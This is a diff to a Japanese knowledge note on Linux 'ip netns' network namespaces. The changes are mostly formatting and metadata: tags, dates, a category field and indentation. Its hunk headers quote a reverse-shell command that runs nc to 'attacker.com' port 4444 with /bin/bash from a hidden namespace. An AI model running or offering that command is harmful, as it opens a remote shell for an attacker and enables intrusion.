@@ -1,16 +1,22 @@
 ---
 tags:
-  - 'ip_netns'
-  - 'ip'
-  - 'namespace'
-  - 'networking'
-  - 'container'
-  - 'docker'
-  - 'chroot'
-  - 'ip_link'
+  - ip_netns
+  - ip
+  - namespace
+  - networking
+  - container
+  - docker
+  - chroot
+  - ip_link
+created: 2025-06-29 15:02
+modified: 2026-01-18 18:03
+environment:
+  - OS/Linux
+vulnearability: []
+knowledge_category: Command
 ---
 
-# `ip netns` - ネットワーク名前空間 (Network Namespace) を管理する
+# Command  - Linux - ip_netns - ネットワーク名前空間 (Network Namespace) を管理する
 
 ## 概要
 
@@ -117,8 +123,8 @@ sudo ip netns exec hidden-ns nc attacker.com 4444 -e /bin/bash
 * 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。
 
 1. **エラーメッセージ例 1**: `Cannot open network namespace "<name>": No such file or directory`
-    * **考えられる原因**: 指定した名前空間が存在しません。
-    * **解決策**: `ip netns list` を実行して、存在する名前空間を確認してください。
+		* **考えられる原因**: 指定した名前空間が存在しません。
+		* **解決策**: `ip netns list` を実行して、存在する名前空間を確認してください。
 
 ## 環境変数と設定ファイル
 
@@ -150,5 +156,4 @@ sudo ip netns exec hidden-ns nc attacker.com 4444 -e /bin/bash
 ## 注意点・補足
 
 * **永続性**: `ip netns add` で作成された名前空間は、システムを再起動すると消滅します。永続化するには、起動スクリプトなどで再度作成する必要があります。
-
 
